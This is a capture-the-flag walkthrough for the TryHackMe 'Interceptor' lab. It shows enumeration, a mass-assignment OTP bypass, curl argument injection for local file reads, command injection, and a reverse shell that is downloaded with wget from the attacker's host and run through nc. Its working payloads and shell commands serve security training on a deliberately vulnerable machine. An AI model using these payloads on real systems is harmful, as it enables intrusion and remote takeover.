# Interceptor

Use Burp or interception knowledge to modify the traffic and pwn the machine.

MediaHub appears to be a normal internal portal used by journalists to manage content. Everything seems protected behind a login and verification system, but the real story lies in how the application communicates with its backend APIs. 

Your task is to assume the role of an attacker and closely observe traffic between the browser and the server. Using your skills, intercept the requests, analyse how the application processes them, and experiment with modifying the data being sent.

If you understand the flow well enough, a small change in the request might be all it takes to bypass the intended controls. Fire up your , intercept the traffic, and see if you can manipulate the requests to take control of the system.

Room: https://tryhackme.com/room/interceptor

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/interceptor.md

---

# 1. Initial Enumeration

We start with a full port scan and service detection.

```bash
nmap -sV -p- 10.64.166.88
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-03 11:27 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for mediahub.thm (10.64.166.88)
Host is up (0.00026s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
```

Interesting services:

```text
22/tcp  SSH
53/tcp  DNS
80/tcp  HTTP Apache
```

The web server is the main target.

---

# 2. Web Enumeration

First Gobuster attempt:

```bash
gobuster dir -u http://10.64.166.88 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js,css,bak,old,zip
```

The server returns `200 OK` for random non-existing URLs, so Gobuster complains:

```text
Error: the server returns a status code that matches the provided options for non existing urls. http://10.64.166.88/e592ed66-d478-4bd9-9ebb-2d9eddcfd7a0 => 200 (Length: 1491). To continue please exclude the status code or the length
```

The fake/default page has length `1491`, so we exclude that length:

```bash
gobuster dir -u http://10.64.166.88 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js,css,bak,old,zip --exclude-length 1491 -b 403 -o gobuster.txt
```

Output:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.64.166.88
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          1491
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,js,css,bak,old,zip,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.64.166.88/assets/]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/footer.php           (Status: 200) [Size: 85]
/header.php           (Status: 200) [Size: 1231]
/javascript           (Status: 301) [Size: 317] [--> http://10.64.166.88/javascript/]
/login.php            (Status: 200) [Size: 2874]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.64.166.88/phpmyadmin/]
/search.php           (Status: 302) [Size: 0] [--> login.php]
/style.css            (Status: 200) [Size: 1625]
/uploads              (Status: 301) [Size: 314] [--> http://10.64.166.88/uploads/]
Progress: 41526 / 41535 (99.98%)
===============================================================
Finished
===============================================================
```

Interesting findings:

```text
/login.php
/dashboard.php
/search.php
/otp.php later discovered
/uploads/
/config.php
/phpmyadmin/
```

The protected pages redirect to `login.php`, so authentication is enforced server side.

---

# 3. Looking for Backup Files

After Gobuster finds real paths, build a short list of discovered names:

```bash
grep '^/' gobuster.txt | awk '{print $1}' | sed 's#^/##' > found.txt
```

Then run backup-extension discovery against those known names:

```bash
gobuster dir -u http://10.64.166.88 -w found.txt -x txt,bak,back,bk,old,zip,backup,save,sav,tmp,temp,orig,copy,disabled,dist,conf,config,swp,swo,~,tar,tar.gz,tgz,gz,7z,rar --exclude-length 1491 -b 403
```

Output:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.64.166.88
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                found.txt
[+] Negative Status codes:   403
[+] Exclude Length:          1491
[+] User Agent:              gobuster/3.6
[+] Extensions:              temp,dist,bk,tmp,tar,tar.gz,config,swo,~,zip,sav,swp,gz,disabled,txt,conf,tgz,7z,rar,back,old,copy,bak,backup,save,orig
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.64.166.88/assets/]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/footer.php           (Status: 200) [Size: 85]
/header.php           (Status: 200) [Size: 1231]
/javascript           (Status: 301) [Size: 317] [--> http://10.64.166.88/javascript/]
/login.php.bak        (Status: 200) [Size: 2038]
/login.php            (Status: 200) [Size: 2874]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.64.166.88/phpmyadmin/]
/search.php           (Status: 302) [Size: 0] [--> login.php]
/style.css            (Status: 200) [Size: 1625]
/uploads              (Status: 301) [Size: 314] [--> http://10.64.166.88/uploads/]
Progress: 1134 / 1161 (97.67%)
===============================================================
Finished
===============================================================
```

This reveals:

```text
/login.php.bak
```

Download it:

```bash
wget http://10.64.166.88/login.php.bak
```

Contents:

```php
<?php
include "header.php";

/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Password policy reminder:
| Admin password follows company format:
| XXXXXXXX XXXXXXXXX
|
| TODO: remove before production deployment
*/
?>
```

Trying the obvious from the comment will log you in. 

Successful login response:

```json
{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```

---

# 4. Understanding the Login Flow

The normal login page JavaScript submits the form to `api_login.php` using `FormData`.

The important behaviour:

```text
login.php
  -> POST api_login.php
  -> receives JSON
  -> if ok is true, redirects to data.redirect
```

Manually altering the login response to something like this will make the browser redirect:

```json
{"ok":true,"message":"Login successful","redirect":"dashboard.php"}
```

However, that alone does not authenticate the session. `dashboard.php` still checks the PHP session server-side and redirects back to `login.php`.

So the server must naturally set session state through the real login flow.

---

# 5. OTP Verification

After logging in with the admin credentials, the app redirects to `otp.php`.

Submit any six-digit OTP and inspect the request in browser developer tools or Burp. The OTP form posts to:

```text
http://10.64.166.88/verify_otp.php
```

Example body:

```text
------geckoformboundary87ec75858de5d4c7c99116e4c1e29203
Content-Disposition: form-data; name="otp"

000000
------geckoformboundary87ec75858de5d4c7c99116e4c1e29203--
```

Failed response:

```json
{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```

The response includes an interesting field:

```text
is_verified
```

Since the room is about modifying intercepted traffic, try changing the data sent to `verify_otp.php`.

In the browser developer tools Network tab, right-click the `verify_otp.php` request and choose edit/resend. Change the body from:

```text
------geckoformboundary87ec75858de5d4c7c99116e4c1e29203
Content-Disposition: form-data; name="otp"

000000
------geckoformboundary87ec75858de5d4c7c99116e4c1e29203--
```

To:

```text
------geckoformboundary87ec75858de5d4c7c99116e4c1e29203
Content-Disposition: form-data; name="is_verified"

true
------geckoformboundary87ec75858de5d4c7c99116e4c1e29203--
```

Response:

```json
{"ok":true,"message":"OTP verified. Redirecting..."}
```

Now browse to:

```text
http://10.64.166.88/dashboard.php
```

You should be logged in as admin.

Admin flag found:

```text
THM{XXXX_XXXX_XXXXX_BURP}
```

## Why this works

The vulnerable endpoint accepts client-supplied fields and applies them to the pending user object. Sending `is_verified=true` tricks the server into finalising the login session without knowing the real OTP.

This is a mass-assignment style issue.

---

# 6. Optional OTP Brute Force Practice

The OTP can be brute-forced if you target the correct endpoint using Burp Suite or Cardio, i used cardio automate and HTTPQL resp.raw.cont:"true"

target 
```text
/verify_otp.php
```

Do not target:

```text
/otp.php
```

`otp.php` is only the HTML page. `verify_otp.php` is the JSON API that checks the code.

To make a descending six-digit OTP wordlist:

```bash
for i in $(seq 999999 -1 0); do printf "%06d\n" "$i"; done > otp_desc.txt
```

This is useful if the OTP is high. In this room, inspecting the source later showed the OTP was hardcoded high.

---

# 7. Source Review of OTP Logic

The source found later explains the issue.

`verify_otp.php`:

```php
<?php
include "config.php";

header("Content-Type: application/json");

function out($ok, $extra = []) {
  echo json_encode(array_merge(["ok" => $ok], $extra));
  exit;
}

if (!isset($_SESSION["pending_user"])) {
  out(false, [
    "error" => "Session expired. Please login again.",
    "is_verified" => false
  ]);
}

$user  = $_SESSION["pending_user"];
$input = $_POST;

/* ---------------------------
   MASS ASSIGNMENT (DEMO)
   Assign whatever the client sends
----------------------------*/

foreach($input as $key => $value){
    $user[$key] = $value;
}

/*
   SERVER PROTECTION RULE
   Regardless of what client sends,
   verification must remain false
*/
 
//$user["is_verified"] = false;

if($user["is_verified"]){
$user["is_verified"] = true;

/* finalize login */

$_SESSION["user"] = $user;

unset($_SESSION["pending_user"]);
unset($_SESSION["otp"]);

out(true, ["message" => "OTP verified. Redirecting..."]);
}

/* OTP validation */

$otp = $input["otp"] ?? "";

if ($otp !== ($_SESSION["otp"] ?? "")) {

  $_SESSION["pending_user"] = $user;

  out(false, [
    "error" => "Invalid OTP. Try again.",
    "is_verified" => false
  ]);
}

/* OTP success → server sets verified */

$user["is_verified"] = true;

/* finalize login */

$_SESSION["user"] = $user;

unset($_SESSION["pending_user"], $_SESSION["otp"]);

out(true, [
  "message" => "OTP verified. Redirecting...",
  "is_verified" => true
]);
```

The vulnerable section is:

```php
foreach($input as $key => $value){
    $user[$key] = $value;
}
```

The intended defensive line is commented out:

```php
//$user["is_verified"] = false;
```

That means if we send:

```text
is_verified=true
```

then `$user["is_verified"]` becomes true before the OTP check.

The login source also showed the OTP itself was hardcoded:

```php
$_SESSION['otp'] = "xxxxxxx"; 
```

So the real OTP is hard coded


But the mass assignment bypass is cleaner.

---

# 8. Feed Importer and Local File Read

Once logged in, the dashboard has:

```text
Upload profile picture
Import feed
```

The import feed feature uses `curl` server-side to download the supplied URL.

While testing the feed importer, a filter bypass worked by providing two URL-looking arguments:

```text
http:// file:///var/www/user.txt
```

The output showed curl erroring on the first malformed URL, then reading the local file URL:

```text
curl: (3) URL using bad/illegal format or missing URL % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 100 31 100 31 0 0 31000 0 --:--:-- --:--:-- --:--:-- 31000 THM{SYSTEM_PWNED_SUCCESSFULLY}
```

System flag found:

```text
THM{XXXXXXX_XXXXXX_SUCCESSFULLY}
```

## Why this works

The application appears to pass user input to `curl` in an unsafe way. By supplying:

```text
http:// file:///var/www/user.txt
```

we make `curl` process multiple arguments. The `http://` argument fails, but the `file://` argument succeeds and reads a local file.

---

# 9. Command Injection via Feed Importer

Testing with command substitution showed that shell expansion was happening.

A payload like this caused the server-side `curl` command to expand the current directory listing:

```text
http:// $(ls)
```

Resulting output included curl attempting to resolve local filenames as hosts:

```text
curl: (6) Could not resolve host: api_login.php
curl: (6) Could not resolve host: assets
curl: (6) Could not resolve host: config.php
curl: (6) Could not resolve host: dashboard.php
curl: (6) Could not resolve host: footer.php
curl: (6) Could not resolve host: header.php
curl: (6) Could not resolve host: import_feed_api.php
curl: (6) Could not resolve host: index.php
curl: (6) Could not resolve host: login.php
curl: (6) Could not resolve host: login.php.bak
curl: (6) Could not resolve host: logout.php
curl: (6) Could not resolve host: main.py
curl: (6) Could not resolve host: otp.php
curl: (6) Could not resolve host: search.php
curl: (6) Could not resolve host: style.css
curl: (6) Could not resolve host: upload_profile.php
curl: (6) Could not resolve host: uploads
curl: (6) Could not resolve host: verify_otp.php
```

This confirms command substitution and gives a file listing from the web root.

---

# 10. Getting a Shell

Several direct shell attempts caused the website to hang or did not connect back. The working method was to host a shell script, download it to the target using command substitution, then execute it.

Create `shell.sh`:

```bash
#!/bin/sh
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 10.64.123.211 4444 > /tmp/f
```

Start a listener:

```bash
nc -lvnp 4444
```

Host the shell script:

```bash
python3 -m http.server
```

Use the feed importer to download it:

```text
http://$(wget http://10.64.123.211:8000/shell.sh)
```

HTTP server output:

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.64.166.88 - - [02/May/2026 12:16:32] "GET /shell.sh HTTP/1.1" 200 -
```

Then execute it:

```text
http://$(sh shell.sh)
```

Listener:

```text
Connection received on 10.64.169.30 43006
/bin/sh: 0: can't access tty; job control turned off
$ $ whoami
www-data
$ 
```

We have command execution as:

```text
www-data
```

---

# 11. Key Takeaways

## Backup disclosure

`login.php.bak` exposed credentials and password policy information.

## Authentication bypass through mass assignment

`verify_otp.php` allowed client-supplied fields to overwrite trusted server-side user state.

The critical field was:

```text
is_verified=true
```

